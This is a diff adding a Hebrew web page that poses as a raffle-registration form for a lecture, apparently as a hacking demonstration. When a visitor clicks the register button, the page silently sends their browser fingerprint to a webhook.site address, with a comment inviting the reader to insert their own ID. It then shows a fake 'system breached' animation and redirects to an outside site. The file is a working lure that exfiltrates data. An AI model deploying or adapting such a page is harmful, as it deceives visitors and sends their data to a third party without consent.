@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>מבצע נובל למצוינות</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; transition: background 0.5s; }
+        .card { background: white; padding: 2rem; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }
+        h1 { color: #1a73e8; }
+        button { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 25px; font-size: 18px; cursor: pointer; transition: transform 0.2s; }
+        button:hover { transform: scale(1.05); }
+        
+        /* עיצוב למצב "פריצה" */
+        .hacked-body { background-color: #0a0a0a; color: #0f0; font-family: 'Courier New', Courier, monospace; }
+        .progress-container { display: none; margin-top: 20px; }
+        .progress-bar { width: 0%; height: 20px; background: #0f0; transition: width 0.1s; }
+        #log { font-size: 12px; margin-top: 10px; text-align: left; height: 60px; overflow: hidden; }
+    </style>
+</head>
+<body>
+
+<div class="card" id="mainCard">
+    <h1>ברוכים הבאים! 🚀</h1>
+    <p>לחצו למטה כדי להירשם להגרלה ולקבל חומרים מההרצאה</p>
+    <button onclick="startExploit()">אני רוצה להירשם!</button>
+    
+    <div class="progress-container" id="exploitBox">
+        <p>מתחבר לשרת מרוחק...</p>
+        <div style="width: 100%; border: 1px solid #0f0;">
+            <div class="progress-bar" id="bar"></div>
+        </div>
+        <div id="log"></div>
+    </div>
+</div>
+
+<script>
+    async function startExploit() {
+        // 1. שינוי ויזואלי למצב "האקרי"
+        document.body.classList.add('hacked-body');
+        document.getElementById('mainCard').style.background = '#111';
+        document.getElementById('exploitBox').style.display = 'block';
+        document.querySelector('button').style.display = 'none';
+        document.querySelector('h1').innerText = "SYSTEM BREACHED";
+        document.querySelector('h1').style.color = "#0f0";
+
+        // 2. שליחת הפיילואד ל-Webhook שלך
+        const webhookUrl = 'https://webhook.site/5de4be8b-0a26-4497-ad42-ac349b9f40af'; // שים פה את ה-ID שלך
+        const pailyoad = {
+            status: "INFILTRATED",
+            user_agent: navigator.userAgent,
+            platform: navigator.platform,
+            screen_res: `${window.screen.width}x${window.screen.height}`,
+            timestamp: new Date().toISOString()
+        };
+
+        // שליחה שקטה
+        fetch(`${webhookUrl}?data=${btoa(JSON.stringify(pailyoad))}`, { mode: 'no-cors' });
+
+        // 3. אנימציה של פיילואד מזויף על המסך
+        const logs = [
+            "> Connecting to port 8080...",
+            "> Bypassing local firewall...",
+            "> Extracting session tokens...",
+            "> Uploading user_profile to remote server...",
+            "> SUCCESS: Target compromised."
+        ];
+        
+        let i = 0;
+        const bar = document.getElementById('bar');
+        const logBox = document.getElementById('log');
+
+        const interval = setInterval(() => {
+            i += 2;
+            bar.style.width = i + "%";
+            if (i % 20 === 0) {
+                logBox.innerHTML += logs[i/20 - 1] + "<br>";
+            }
+            if (i >= 100) {
+                clearInterval(interval);
+                setTimeout(() => {
+                    // הפנייה לאתר האמיתי בסיום
+                    window.location.href = "https://www.nobel4education.org.il/";
+                }, 1000);
+            }
+        }, 50);
+    }
+</script>
+
+</body>
+</html>
